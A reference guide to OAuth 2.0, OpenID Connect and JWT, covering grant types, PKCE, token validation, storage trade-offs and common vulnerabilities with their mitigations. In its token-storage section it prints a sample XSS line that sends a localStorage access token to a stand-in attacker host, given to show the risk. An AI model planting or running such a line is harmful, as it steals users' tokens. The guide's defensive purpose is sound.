# OAuth 2.0 + OpenID Connect — Complete Reference Guide

> **Scope of this document:** Pure protocol reference — OAuth 2.0, all grant types, OIDC, JWT, and production security patterns. Vendor-specific tooling (Apigee, PingFederate) is covered in separate documents.

---

## Table of Contents

1. [Module 1 — The problem OAuth 2.0 solves](#module-1)
2. [Module 2 — JWT anatomy, signing, and validation](#module-2)
3. [Module 3 — Client Credentials grant](#module-3)
4. [Module 4 — Authorization Code grant + PKCE](#module-4)
5. [Module 5 — Other grant types](#module-5)
6. [Module 6 — OpenID Connect (OIDC)](#module-6)
7. [Module 7 — Production patterns and security hardening](#module-7)
8. [Quick Reference — Cheat Sheet](#quick-reference)

---

## Module 1 — The problem OAuth 2.0 solves {#module-1}

### The credential-sharing problem

Before OAuth, granting a third-party app access to your data required giving it your username and password. The app stored your credentials, had unrestricted permanent access, and you could only revoke that access by changing your password everywhere.

**Real-world example:** Early Twitter apps asked for your Twitter password to post on your behalf. If one of those apps was breached, attackers had your password — not just access to Twitter.

### What OAuth 2.0 is (and is not)

- **OAuth 2.0 is an authorisation framework.** It answers: "what is this application allowed to do?"
- **OAuth 2.0 is NOT an authentication protocol.** It does not tell you who the user is. That is what OpenID Connect adds.
- It standardises *delegated access* — an app acts on a user's behalf with limited, time-bound, revocable permissions.

### The four actors

```
┌─────────────────┐     owns data      ┌─────────────────┐
│ Resource Owner  │ ──────────────────▶ │ Resource Server │
│  (the user)     │                     │   (the API)     │
└────────┬────────┘                     └────────▲────────┘
         │ grants consent                         │ validates token
         ▼                                        │
┌─────────────────┐   requests token   ┌──────────┴──────┐
│    Client       │ ──────────────────▶ │  Auth Server    │
│  (the app)      │ ◀──────────────────  │  (issues token) │
└─────────────────┘   receives token   └─────────────────┘
```

| Actor | Role | Real-world example |
|---|---|---|
| Resource Owner | The user who owns the data and grants consent | You, the end user |
| Client | The application requesting access | A web app, mobile app, or microservice |
| Authorization Server | Issues tokens after verifying identity and consent | PingFederate, Okta, Auth0, Google |
| Resource Server | The API that holds protected data and accepts tokens | Your backend API |

### The token mental model

**Access token** — a signed permission slip. Short-lived (minutes to 1 hour). Sent with every API request. Like a hotel key card: limited access, expires automatically.

**Refresh token** — a long-lived credential used only to get new access tokens. Sent only to the Auth Server. Like the contract that lets you re-issue a key card. Must be stored very securely.

```
Before OAuth:                     After OAuth:
─────────────                     ────────────
App stores your password          App never sees your password
Full access forever               Scoped access only
Can't revoke one app              Revoke per-app anytime
Breach = attacker has password    Breach = attacker has short-lived token
```

---

## Module 2 — JWT anatomy, signing, and validation {#module-2}

### What is a JWT?

A JSON Web Token (JWT) is the most common format for OAuth access tokens. It is **self-contained** — the Resource Server can validate it without calling the Auth Server on every request, because it carries a cryptographic signature.

> **Important:** JWTs are Base64url-encoded, not encrypted. Anyone can decode and read the payload. Never put secrets, passwords, or sensitive PII in a JWT payload.

### Structure

```
eyJhbGciOiJSUzI1NiIsImtpZCI6ImtleS0xIn0    ← Header (Base64url)
.
eyJpc3MiOiJodHRwczovL2F1dGguZXhhbXBsZS5jb20iLCJzdWIiOiJ1c2VyXzEyMyJ9   ← Payload (Base64url)
.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c   ← Signature
```

### Header (decoded)

```json
{
  "alg": "RS256",
  "kid": "key-1",
  "typ": "JWT"
}
```

| Field | Meaning |
|---|---|
| `alg` | Signing algorithm. The receiver must validate this matches an allowed algorithm. |
| `kid` | Key ID. Used to look up the correct public key from the JWKS endpoint. |
| `typ` | Token type. Always `JWT`. |

### Payload — standard claims

```json
{
  "iss": "https://auth.example.com",
  "sub": "user_123",
  "aud": "https://api.example.com",
  "exp": 1713456789,
  "iat": 1713453189,
  "jti": "a8f3c2d1-4b5e-6f7a-8b9c-0d1e2f3a4b5c",
  "scope": "api.read profile",
  "email": "john@example.com",
  "roles": ["admin", "user"]
}
```

| Claim | Name | Who validates it | Purpose |
|---|---|---|---|
| `iss` | Issuer | Resource Server | Must match the expected Auth Server URL. Prevents dev tokens being used in prod. |
| `sub` | Subject | Application | Stable unique ID for the user or service. Use this as the database key, not email. |
| `aud` | Audience | Resource Server | Must match the API's identifier. Prevents tokens issued for one API being used on another. |
| `exp` | Expiry | Resource Server | Unix timestamp. Token must be rejected after this time. |
| `iat` | Issued At | Optional | When the token was created. |
| `jti` | JWT ID | Optional | Unique token ID. Store used JTIs to prevent replay attacks. |
| `scope` | Scope | Resource Server | Space-separated permissions. Check the required scope is present. |

### Signing algorithms

| Algorithm | Type | Use | Notes |
|---|---|---|---|
| `RS256` | Asymmetric (RSA) | ✅ Recommended | Auth Server signs with private key; anyone verifies with public key via JWKS. |
| `ES256` | Asymmetric (ECDSA) | ✅ Preferred | Same model as RS256 but smaller keys and faster. Increasingly standard. |
| `HS256` | Symmetric (HMAC) | ⚠️ Avoid for APIs | Same secret signs and verifies — if the API has the secret, it can forge tokens. Only for internal systems where both sides are fully trusted. |

### RS256 validation flow

```
Auth Server                JWKS Endpoint              Resource Server
──────────────            ────────────────           ─────────────────
Signs JWT with      →      Public key published  ←    Fetches public key
private key                at /pf/JWKS                (once, caches it)
                                                       Verifies signature
                                                       Checks exp, iss, aud
```

### Critical security rule

Always **explicitly set allowed algorithms** on the receiving side. The `alg:none` attack works by setting `"alg":"none"` in the header, which tricks naive libraries into skipping signature verification entirely.

```javascript
// WRONG — allows alg:none attack
jwt.verify(token, publicKey);

// CORRECT — restrict allowed algorithms
jwt.verify(token, publicKey, { algorithms: ['RS256', 'ES256'] });
```

### JWT vs opaque tokens

| | JWT | Opaque |
|---|---|---|
| Validation | Local (no network call) | Requires introspection call to Auth Server |
| Revocation | Cannot revoke before expiry | Revocable instantly |
| Contents | Visible claims in payload | Opaque reference — only Auth Server knows what it means |
| Performance | Fast (local validation) | Adds latency per request |
| Use when | High-traffic APIs, distributed systems | Strict revocation required, financial transactions |

**The logout problem with JWTs:** Because JWTs cannot be revoked, a user who "logs out" still has a valid token until it expires. Solutions: very short expiry (5-15 min), token blocklist (Redis), or opaque tokens for security-sensitive operations.

---

## Module 3 — Client Credentials grant {#module-3}

### When to use it

The application itself is the Resource Owner. There is no user. The app authenticates using its own registered identity (client_id + client_secret).

**Use for:**
- Microservice-to-microservice calls
- Scheduled cron jobs and batch processes
- CI/CD pipelines calling deployment or registry APIs
- Backend data sync and ETL processes
- IoT device telemetry uploads

**Do NOT use when:**
- A real human user is involved
- You need per-user data access
- The action is being performed on behalf of a specific user

### Complete flow

```
1. App → Auth Server
   POST /token
   Authorization: Basic base64(client_id:client_secret)
   Body: grant_type=client_credentials&scope=api.read

2. Auth Server validates credentials and scope registration

3. Auth Server → App
   200 OK
   {
     "access_token": "eyJhbGci...",
     "token_type": "Bearer",
     "expires_in": 3600,
     "scope": "api.read"
   }
   NOTE: No refresh_token is issued for Client Credentials

4. App caches token in memory, reuses until ~5 min before expiry

5. App → Resource Server
   GET /api/resource
   Authorization: Bearer eyJhbGci...

6. Resource Server validates JWT locally via JWKS → 200 OK
```

### Token payload for Client Credentials

```json
{
  "iss": "https://auth.example.com",
  "sub": "order-service",          ← The service, not a user
  "aud": "https://payment-api.example.com",
  "scope": "payment.initiate payment.read",
  "exp": 1713456789,
  "client_id": "order-service"     ← Same as sub for CC tokens
}
```

### Real-world: payment microservices platform

```
Order Service ──(token: order-svc)──▶ Auth Server ──▶ issues token
     │                                                         │
     │ Bearer token (scope: payment.initiate)                  │
     ▼                                                         │
Payment Service ◀── validates JWT locally ◀──────────────────┘
     │
     │ Bearer token (scope: fraud.check) — separate token request
     ▼
Fraud Service
```

Each service has its own `client_id`. When Order Service calls Payment Service, it uses its service-scoped token. Payment Service checks: `iss` ✓ `aud` ✓ `scope contains "payment.initiate"` ✓.

### Token caching pattern (Node.js)

```javascript
let cachedToken = null;
let tokenExpiry = 0;

async function getAccessToken() {
  const now = Math.floor(Date.now() / 1000);
  const bufferSeconds = 300; // refresh 5 min before expiry

  if (cachedToken && now < tokenExpiry - bufferSeconds) {
    return cachedToken; // reuse cached token
  }

  const response = await fetch('https://auth.example.com/token', {
    method: 'POST',
    headers: {
      'Authorization': 'Basic ' + Buffer.from(`${CLIENT_ID}:${CLIENT_SECRET}`).toString('base64'),
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      grant_type: 'client_credentials',
      scope: 'api.read'
    })
  });

  const data = await response.json();
  cachedToken = data.access_token;
  tokenExpiry = now + data.expires_in;
  return cachedToken;
}
```

### Client secret management

| Environment | How to store the secret |
|---|---|
| Development | Environment variables (`.env` file, never committed) |
| Production | HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, GCP Secret Manager |
| **Never** | Source code, config files in git, hardcoded strings, log files |

**Zero-downtime secret rotation:**
1. Register a second client secret in the Auth Server
2. Deploy the new secret to all instances
3. Remove the old secret from the Auth Server once all instances are using the new one

**Alternative to client_secret for high-security environments:** mTLS client authentication — the client presents a certificate instead of a secret. The Auth Server verifies the certificate. No shared secret to leak.

---

## Module 4 — Authorization Code grant + PKCE {#module-4}

### The core insight: front-channel vs back-channel

The browser (front channel) is untrusted. Anything in a URL is visible in browser history, referrer headers, and server logs. So we never send the access token through the browser.

Instead:
1. **Front channel (URL redirect):** carries only the `auth_code` — short-lived (60s), single-use, useless without the client secret or PKCE verifier
2. **Back channel (server-to-server HTTPS):** carries the actual tokens — never touches the browser

### Complete flow with PKCE

```
Step 1: App generates PKCE pair
  code_verifier  = random 64-byte value (e.g. "dBjftJeZ4CVP-...")
  code_challenge = BASE64URL(SHA256(code_verifier))

Step 2: App redirects browser to Auth Server (front channel)
  GET /authorize
    ?response_type=code
    &client_id=my-app
    &redirect_uri=https://app.example.com/callback
    &scope=openid+profile+api.read
    &state=random_csrf_token         ← CSRF prevention
    &code_challenge=BASE64URL(SHA256(verifier))
    &code_challenge_method=S256

Step 3: Auth Server shows login page, user authenticates and consents

Step 4: Auth Server redirects back with auth code (front channel)
  GET https://app.example.com/callback
    ?code=SplxlOBeZQQYbYS6WxSbIA
    &state=random_csrf_token         ← App verifies this matches

Step 5: App exchanges code for tokens (back channel — server-to-server)
  POST /token
  Authorization: Basic base64(client_id:client_secret)
  Body:
    grant_type=authorization_code
    code=SplxlOBeZQQYbYS6WxSbIA
    redirect_uri=https://app.example.com/callback
    code_verifier=dBjftJeZ4CVP-...   ← PKCE proof

Step 6: Auth Server verifies SHA256(code_verifier) == code_challenge

Step 7: Auth Server returns tokens
  {
    "access_token":  "eyJhbGci...",  ← Send to APIs
    "id_token":      "eyJhbGci...",  ← Use in your app only, NEVER send to API
    "refresh_token": "8xLOxBtZ...",  ← Store securely, send only to Auth Server
    "expires_in":    3600
  }

Step 8: App calls API with access_token only
  GET /api/resource
  Authorization: Bearer <access_token>
```

### PKCE — the auth code interception attack

```
Without PKCE:
  1. Malicious app on same device registers the same redirect URI
  2. It intercepts the auth_code from the redirect
  3. It sends the code to the token endpoint with its own client_id
  4. Auth Server cannot tell the code was stolen → issues token to attacker

With PKCE:
  1. Legitimate app generates code_verifier and sends SHA256(verifier) as challenge
  2. Malicious app intercepts the code
  3. It cannot produce the code_verifier (never transmitted over front channel)
  4. Auth Server rejects the exchange → attack fails
```

### PKCE implementation (browser)

```javascript
// Generate PKCE verifier and challenge
async function generatePKCE() {
  const array = new Uint8Array(64);
  crypto.getRandomValues(array);
  const verifier = btoa(String.fromCharCode(...array))
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');

  const encoder = new TextEncoder();
  const digest = await crypto.subtle.digest('SHA-256', encoder.encode(verifier));
  const challenge = btoa(String.fromCharCode(...new Uint8Array(digest)))
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');

  return { verifier, challenge };
}

// Before redirect
const { verifier, challenge } = await generatePKCE();
const state = crypto.randomUUID();

// Store in sessionStorage (cleared on tab close)
sessionStorage.setItem('pkce_verifier', verifier);
sessionStorage.setItem('oauth_state', state);

// Build authorization URL
const authUrl = new URL('https://auth.example.com/authorize');
authUrl.searchParams.set('response_type', 'code');
authUrl.searchParams.set('client_id', 'my-app');
authUrl.searchParams.set('redirect_uri', 'https://app.example.com/callback');
authUrl.searchParams.set('scope', 'openid profile api.read');
authUrl.searchParams.set('state', state);
authUrl.searchParams.set('code_challenge', challenge);
authUrl.searchParams.set('code_challenge_method', 'S256');
window.location.href = authUrl.toString();

// In callback handler
function handleCallback() {
  const params = new URLSearchParams(window.location.search);

  // Verify state to prevent CSRF
  if (params.get('state') !== sessionStorage.getItem('oauth_state')) {
    throw new Error('State mismatch — possible CSRF attack');
  }

  const code = params.get('code');
  const verifier = sessionStorage.getItem('pkce_verifier');

  // Clean up
  sessionStorage.removeItem('pkce_verifier');
  sessionStorage.removeItem('oauth_state');

  return exchangeCodeForTokens(code, verifier);
}
```

### The state parameter and nonce

| Parameter | Protects against | How to use |
|---|---|---|
| `state` | Login CSRF — attacker tricks browser into completing attacker's login | Generate random UUID before redirect, store in sessionStorage, verify on callback |
| `nonce` | ID token replay attacks in OIDC | Generate random value, include in auth request, verify it appears in the returned ID token |

### Real-world: enterprise HR portal

```json
// Access token payload for employee accessing HR portal
{
  "iss": "https://identity.company.com",
  "sub": "employee_78234",
  "aud": "https://hr-api.company.com",
  "exp": 1713456789,
  "scope": "openid profile hr.read hr.self",
  "email": "jane.smith@company.com",
  "roles": ["employee", "manager"],
  "department": "Engineering",
  "employee_id": "EMP78234"
}
```

The HR API enforces:
- `hr.read` scope → can view team data
- `hr.self` scope → can view own data
- `"manager"` role → can approve leave requests for their team

---

## Module 5 — Other grant types {#module-5}

### Device Code grant (RFC 8628)

For devices with no browser or limited input: smart TVs, CLI tools, IoT sensors, gaming consoles.

```
Step 1: Device → Auth Server
  POST /device_authorization
  Body: client_id=my-tv-app&scope=openid profile

Step 2: Auth Server → Device
  {
    "device_code":      "GmRhmhcxhwAzkoEqiMEg_DnyEysNkuNhszIySk9eS",
    "user_code":        "BDPF-YTVQ",
    "verification_uri": "https://auth.example.com/device",
    "expires_in":       1800,
    "interval":         5
  }

Step 3: TV displays to user
  "Visit: auth.example.com/device
   Enter code: BDPF-YTVQ"

Step 4: User visits URL on phone/laptop, enters code, authenticates and approves

Step 5: Device polls every 5 seconds
  POST /token
  Body: grant_type=urn:ietf:params:oauth:grant-type:device_code
        &device_code=GmRhmhcxhwAzkoEqiMEg_DnyEysNkuNhszIySk9eS
        &client_id=my-tv-app

  → Receives "authorization_pending" until user approves
  → Once approved: 200 OK with access_token

Real-world uses: YouTube sign-in on TV, AWS CLI --sso, GitHub CLI, Spotify on smart speakers
```

### Refresh Token grant — silent renewal

Refresh tokens are only issued for the **Authorization Code** and **Device Code** grants (not Client Credentials).

```javascript
// Recommended pattern: proactive refresh before expiry
class TokenManager {
  constructor() {
    this.accessToken = null;
    this.refreshToken = null;
    this.expiresAt = 0;
  }

  async getValidAccessToken() {
    const now = Math.floor(Date.now() / 1000);
    const bufferSeconds = 60; // refresh 60s before expiry

    if (this.accessToken && now < this.expiresAt - bufferSeconds) {
      return this.accessToken; // still valid
    }

    if (!this.refreshToken) {
      throw new Error('No refresh token — user must log in');
    }

    return this.refresh();
  }

  async refresh() {
    const response = await fetch('https://auth.example.com/token', {
      method: 'POST',
      body: new URLSearchParams({
        grant_type: 'refresh_token',
        refresh_token: this.refreshToken,
        client_id: CLIENT_ID
        // Note: some servers require client_secret here too
      })
    });

    if (response.status === 400) {
      // Refresh token expired or revoked — force re-login
      this.clearTokens();
      redirectToLogin();
      return;
    }

    const tokens = await response.json();
    this.accessToken = tokens.access_token;
    this.expiresAt = Math.floor(Date.now() / 1000) + tokens.expires_in;

    // With refresh token rotation: always store the new refresh token
    if (tokens.refresh_token) {
      this.refreshToken = tokens.refresh_token; // old one is now invalid
    }

    return this.accessToken;
  }
}
```

**Refresh token rotation:** the Auth Server issues a new refresh token on every use and immediately invalidates the old one. If a stolen refresh token is used, the legitimate holder's next use will fail — alerting the system to a possible breach. **Always enable refresh token rotation in production.**

### Implicit grant — deprecated ⚠️

**What it was:** Designed for SPAs in 2012 when CORS restrictions made back-channel calls from browsers difficult. The access token was returned directly in the URL fragment: `callback#access_token=xyz`

**Why it was deprecated:**
- Token exposed in browser history
- Token exposed in Referrer headers to third-party scripts
- No refresh token issued (by design)
- No mechanism to bind the token to the requesting client
- Token could be intercepted by other scripts on the page

**What to use instead:** Authorization Code + PKCE. CORS is universally supported today — the original justification no longer exists.

**Status:** Removed from OAuth 2.1.

### Resource Owner Password Credentials (ROPC) — deprecated ⚠️

**What it was:** The app collects the user's username and password directly and sends them to the token endpoint.

```
POST /token
Body: grant_type=password
      &username=john@example.com
      &password=hunter2
      &client_id=my-app
```

**Why it defeats the purpose of OAuth:**
- The app sees and handles the user's password — exactly the problem OAuth was designed to eliminate
- No consent screen, no redirect — the user has no visibility into what the app will do
- Cannot support MFA, SSO, or external identity providers
- The "trusted first-party app" justification is invalid — use Auth Code + PKCE instead

**Status:** Removed from OAuth 2.1. If you see this in a codebase, it must be replaced.

---

## Module 6 — OpenID Connect (OIDC) {#module-6}

### What OIDC adds on top of OAuth 2.0

OAuth 2.0 answers: "what is this application allowed to do?"
OIDC additionally answers: "who is the user?"

OIDC is a thin identity layer on top of OAuth 2.0. It adds:
1. **ID Token** — a JWT specifically about the authenticated user
2. **UserInfo Endpoint** — an API to get additional user claims
3. **Standard scopes** — `openid`, `profile`, `email`, `address`, `phone`
4. **Discovery endpoint** — `.well-known/openid-configuration`
5. **Session management** — logout and session state notifications

### The three tokens in an OIDC Auth Code flow

| Token | For | aud claim | Lifetime | Rule |
|---|---|---|---|---|
| Access token | Calling APIs | The API's URL | Short (1 hour) | Send to every API request |
| ID token | Your application only | Your `client_id` | Short (1 hour) | **NEVER send to an API** |
| Refresh token | Getting new access tokens | — | Long (days/months) | Store securely, send only to Auth Server |

> **The single most common OIDC mistake:** sending the ID token to an API instead of the access token. The ID token's `aud` is your `client_id` — a properly configured API will reject it.

### ID token structure

```json
{
  "iss": "https://auth.example.com",
  "sub": "user_123",                   ← Stable unique user identifier
  "aud": "my-client-app",             ← YOUR client_id, not the API
  "exp": 1713456789,
  "iat": 1713453189,
  "nonce": "n-0S6_WzA2Mj",            ← Verify this matches what you sent
  "at_hash": "77QmUPtjPfzWtF2AnpK9RQ", ← Binds ID token to access token
  "email": "jane@example.com",
  "email_verified": true,
  "name": "Jane Smith",
  "given_name": "Jane",
  "family_name": "Smith",
  "picture": "https://cdn.example.com/jane.jpg"
}
```

### OIDC scopes and what they unlock

```
scope=openid
  → Required for OIDC. Causes an ID token to be issued.
  → Claims: sub

scope=openid profile
  → Claims: name, given_name, family_name, middle_name, nickname,
            preferred_username, profile, picture, website, gender,
            birthdate, zoneinfo, locale, updated_at

scope=openid email
  → Claims: email, email_verified

scope=openid address
  → Claims: address (street_address, locality, region, postal_code, country)

scope=openid phone
  → Claims: phone_number, phone_number_verified
```

### Discovery endpoint

Every OIDC provider publishes a JSON document at:
```
https://[issuer]/.well-known/openid-configuration
```

```javascript
// Fetch once at startup — no hardcoded endpoint URLs needed
const discovery = await fetch(
  'https://auth.example.com/.well-known/openid-configuration'
).then(r => r.json());

// All endpoints discovered automatically:
// discovery.authorization_endpoint
// discovery.token_endpoint
// discovery.userinfo_endpoint
// discovery.jwks_uri
// discovery.revocation_endpoint
// discovery.id_token_signing_alg_values_supported
```

Example discovery document (abbreviated):
```json
{
  "issuer": "https://accounts.google.com",
  "authorization_endpoint": "https://accounts.google.com/o/oauth2/v2/auth",
  "token_endpoint": "https://oauth2.googleapis.com/token",
  "userinfo_endpoint": "https://openidconnect.googleapis.com/v1/userinfo",
  "jwks_uri": "https://www.googleapis.com/oauth2/v3/certs",
  "scopes_supported": ["openid", "email", "profile"],
  "response_types_supported": ["code", "token", "id_token"],
  "subject_types_supported": ["public"],
  "id_token_signing_alg_values_supported": ["RS256"],
  "claims_supported": ["aud", "email", "email_verified", "exp", "name", "sub"]
}
```

### OIDC Authorization Code flow

The same as OAuth Authorization Code, with three additions:
1. Include `openid` in the `scope`
2. Include a `nonce` in the authorization request
3. Validate the ID token claims on receipt

```javascript
// Step 1: Generate nonce and include in auth request
const nonce = crypto.randomUUID();
sessionStorage.setItem('oidc_nonce', nonce);

const authUrl = new URL(discovery.authorization_endpoint);
authUrl.searchParams.set('scope', 'openid profile email api.read');
authUrl.searchParams.set('nonce', nonce);
// ... other params (response_type, client_id, redirect_uri, state, PKCE)

// Step 2: After token exchange, validate the ID token
function validateIdToken(idToken) {
  const payload = parseJWT(idToken); // decode without verifying (library does full verification)

  // Verify claims:
  if (payload.iss !== EXPECTED_ISSUER) throw new Error('Invalid issuer');
  if (payload.aud !== CLIENT_ID) throw new Error('Invalid audience');
  if (payload.exp < Date.now() / 1000) throw new Error('Token expired');
  if (payload.nonce !== sessionStorage.getItem('oidc_nonce')) {
    throw new Error('Nonce mismatch — possible replay attack');
  }

  sessionStorage.removeItem('oidc_nonce');
  return payload;
}

// Step 3: Extract user identity
const user = validateIdToken(tokens.id_token);

// CORRECT: store as composite key
const userId = `${user.iss}|${user.sub}`;
// WRONG: using email as unique key — it can change, and two IdPs can issue the same email
```

### Real-world: "Sign in with Google" dissected

```
1. User clicks "Sign in with Google" on your app

2. Your app redirects to:
   https://accounts.google.com/o/oauth2/v2/auth
     ?response_type=code
     &client_id=YOUR_CLIENT_ID.apps.googleusercontent.com
     &redirect_uri=https://yourapp.com/auth/google/callback
     &scope=openid+email+profile
     &state=RANDOM_STATE
     &nonce=RANDOM_NONCE
     &code_challenge=S256_PKCE_CHALLENGE
     &code_challenge_method=S256

3. Google shows login + consent screen

4. Google redirects to your callback:
   https://yourapp.com/auth/google/callback
     ?code=4/0AX4XfWiM...
     &state=RANDOM_STATE

5. Your server exchanges code for tokens (back-channel):
   POST https://oauth2.googleapis.com/token
   Body: code=4/0AX4XfWiM...
         &grant_type=authorization_code
         &client_id=YOUR_CLIENT_ID
         &client_secret=YOUR_CLIENT_SECRET
         &redirect_uri=https://yourapp.com/auth/google/callback
         &code_verifier=PKCE_VERIFIER

6. Google returns:
   {
     "access_token":  "ya29.a0AfH6...",  ← Use for Google APIs (Calendar, Drive etc.)
     "id_token":      "eyJhbGci...",     ← Use to identify the user in YOUR app
     "expires_in":    3599,
     "token_type":    "Bearer",
     "scope":         "openid email profile"
   }

7. Validate the id_token (signature + iss + aud + exp + nonce)

8. Extract user identity:
   {
     "sub":            "110248495921238986420",  ← Use this as the user ID
     "email":          "jane@gmail.com",
     "email_verified": true,
     "name":           "Jane Smith",
     "picture":        "https://lh3.googleusercontent.com/..."
   }

9. Create or update user record:
   const userId = `https://accounts.google.com|110248495921238986420`
```

> **Key insight:** The `sub` claim is Google's stable unique identifier for this user. Even if the user changes their email, `sub` stays the same. Store `sub` (combined with `iss`) as the primary user key.

### UserInfo endpoint

An alternative to reading claims from the ID token — call the UserInfo endpoint with the access token to get fresh user data:

```javascript
const userInfo = await fetch(discovery.userinfo_endpoint, {
  headers: { Authorization: `Bearer ${accessToken}` }
}).then(r => r.json());

// Returns the same standard claims as the ID token
// Use when: you need very fresh data, or the ID token doesn't include all claims
// Don't use when: you need performance (extra network call)
```

---

## Module 7 — Production patterns and security hardening {#module-7}

### Token storage — the full trade-off matrix

| Storage | XSS risk | CSRF risk | Survives page refresh | Recommendation |
|---|---|---|---|---|
| JS memory (variable) | Low | None | No | ✅ Good for access token in SPAs |
| `localStorage` | **High** | None | Yes | ❌ Never store tokens here |
| `sessionStorage` | **High** | None | No | ⚠️ Only for PKCE verifier/state |
| `httpOnly` cookie | None | Medium (use SameSite) | Yes | ✅ Best for refresh token |
| Server-side (BFF) | None | None | Yes | ✅ Best for SPAs overall |
| OS Keychain/Keystore | None | None | Yes | ✅ Required for mobile apps |

**Why localStorage is dangerous:**
```javascript
// Any XSS payload on your page can do this:
fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'));
// The attacker now has your token and can use it from anywhere
```

**Why httpOnly cookies are safer:**
```javascript
// An XSS payload CANNOT access httpOnly cookies:
document.cookie // → only shows non-httpOnly cookies
// The token cookie is invisible to JavaScript — only sent automatically by the browser
```

### The BFF pattern — Backend for Frontend

The most secure architecture for browser-based (SPA) applications.

```
Browser (React/Vue/Angular)
     │
     │ session cookie only (httpOnly, Secure, SameSite=Strict)
     │ API calls go to /api/* on the same domain
     ▼
BFF (Node/Express/NestJS) ← runs on your server
     │                    ← holds access_token and refresh_token in memory/Redis
     │
     ├── /auth/callback   ← handles OIDC redirect, stores tokens server-side
     ├── /api/*           ← proxies to Resource Server with Bearer token attached
     └── /auth/logout     ← revokes tokens, clears session
     │
     ├── Auth Server  (OIDC flow)
     └── Resource Server  (API calls with Bearer token)
```

```javascript
// BFF: Express.js example
import express from 'express';
import session from 'express-session';

const app = express();

app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: { httpOnly: true, secure: true, sameSite: 'strict' },
  resave: false,
  saveUninitialized: false,
  store: new RedisStore({ client: redisClient }) // persistent sessions
}));

// Auth callback — exchange code, store tokens server-side
app.get('/auth/callback', async (req, res) => {
  const { code, state } = req.query;
  if (state !== req.session.oauthState) return res.status(400).send('CSRF detected');

  const tokens = await exchangeCodeForTokens(code, req.session.pkceVerifier);
  req.session.accessToken = tokens.access_token;
  req.session.refreshToken = tokens.refresh_token;
  req.session.tokenExpiry = Date.now() + tokens.expires_in * 1000;

  res.redirect('/dashboard');
});

// Proxy API calls — attach Bearer token transparently
app.use('/api', async (req, res) => {
  const token = await getValidToken(req.session); // refreshes if needed
  const apiResponse = await fetch(`${API_BASE_URL}${req.path}`, {
    method: req.method,
    headers: {
      ...req.headers,
      Authorization: `Bearer ${token}`
    }
  });
  // stream response back
});
```

### Complete token validation checklist for resource servers

```javascript
import { createRemoteJWKSet, jwtVerify } from 'jose';

const JWKS = createRemoteJWKSet(
  new URL('https://auth.example.com/.well-known/jwks.json'),
  { cacheMaxAge: 600_000 } // cache public keys for 10 minutes
);

async function validateToken(authHeader) {
  if (!authHeader?.startsWith('Bearer ')) {
    throw { status: 401, error: 'missing_token' };
  }

  const token = authHeader.slice(7);

  // Library validates: signature, exp, nbf, iss, aud, algorithms
  const { payload } = await jwtVerify(token, JWKS, {
    issuer:    process.env.EXPECTED_ISSUER,
    audience:  process.env.EXPECTED_AUDIENCE,
    algorithms: ['RS256', 'ES256'],  // prevents alg:none attack
  });

  // Manual checks after library validation:
  const requiredScope = 'api.read';
  if (!payload.scope?.split(' ').includes(requiredScope)) {
    throw { status: 403, error: 'insufficient_scope',
            scope_required: requiredScope };
  }

  return payload;
}

// Validation checklist:
// ✅ Signature valid (RS256/ES256 with correct public key)
// ✅ exp not in the past
// ✅ iss matches expected Auth Server
// ✅ aud matches this API's identifier
// ✅ alg is in the allowed list (never allow alg:none)
// ✅ scope contains the required permission
// Optional:
// ✅ nbf (not before) if present
// ✅ jti not in replay blocklist if using jti
```

### Common OAuth/OIDC vulnerabilities

| Attack | How it works | Mitigation |
|---|---|---|
| Auth code interception | Malicious app intercepts auth code from redirect | PKCE (mandatory) |
| Login CSRF | Attacker tricks browser into completing attacker's login flow | `state` parameter (mandatory) |
| ID token replay | Stolen ID token re-used | `nonce` parameter (mandatory for OIDC) |
| Open redirect | `redirect_uri` manipulated to send code to attacker | Exact redirect URI matching (OAuth 2.1 mandates this) |
| Token leakage via Referrer | Token in URL leaks through Referrer header to third parties | Never put tokens in URLs |
| alg:none attack | JWT header sets `"alg":"none"`, library skips signature check | Always explicitly set allowed algorithms |
| Issuer confusion | Dev token accepted in prod (same library, different issuer) | Always validate `iss` claim |
| Audience confusion | Token for API-A used on API-B | Always validate `aud` claim |
| Token substitution | ID token sent to API instead of access token | Validate `aud` on the API — should be the API URL, not a client_id |

### OAuth 2.1 — changes and migration

OAuth 2.1 (draft) consolidates OAuth 2.0 with all subsequent security RFCs into a single document.

**What is removed:**
- Implicit grant → replaced by Authorization Code + PKCE
- Resource Owner Password Credentials (ROPC) grant

**What is now mandatory:**
- PKCE for all Authorization Code flows (public and confidential clients)
- Refresh token rotation
- Exact redirect URI string matching (no wildcard or partial matching)
- Bearer token prohibited in URL query strings

**Migration checklist for existing implementations:**
```
□ Identify any Implicit grant usage → migrate to Auth Code + PKCE
□ Identify any ROPC grant usage → migrate to Auth Code + PKCE
□ Add PKCE to all existing Auth Code flows
□ Enable refresh token rotation on the Auth Server
□ Audit redirect URI configurations — ensure exact match required
□ Grep codebase for tokens in URL query parameters → move to headers
□ Verify all token validation explicitly sets allowed algorithms
```

---

## Quick Reference — Cheat Sheet {#quick-reference}

### Which grant type to use?

```
Is a human user involved?
├── No  → Client Credentials
└── Yes
    ├── Has a browser?
    │   └── Yes → Authorization Code + PKCE
    ├── Input-constrained device (TV, CLI, IoT)?
    │   └── Yes → Device Code
    └── Building your own first-party login UI?
        └── Use Auth Code + PKCE (never ROPC)
```

### Grant type quick reference

| Grant | User involved | Tokens issued | Use case |
|---|---|---|---|
| Client Credentials | No | Access only | Service-to-service, cron jobs |
| Authorization Code + PKCE | Yes | Access + Refresh + ID (with OIDC) | Web apps, mobile apps |
| Device Code | Yes | Access + Refresh | Smart TVs, CLIs, IoT |
| Refresh Token | Derived from above | New access + new refresh | Silent renewal |
| ~~Implicit~~ | ~~Yes~~ | ~~Access only~~ | ~~Deprecated~~ |
| ~~ROPC~~ | ~~Yes~~ | ~~Access + Refresh~~ | ~~Deprecated~~ |

### JWT validation quick reference

```
Resource server must validate:
✅ Signature   — verify with public key from JWKS endpoint
✅ alg         — must be in explicit allow-list (never allow alg:none)
✅ exp         — current time must be before expiry
✅ iss         — must match the expected Auth Server URL
✅ aud         — must match this API's own identifier
✅ scope       — must contain the permission required for this endpoint

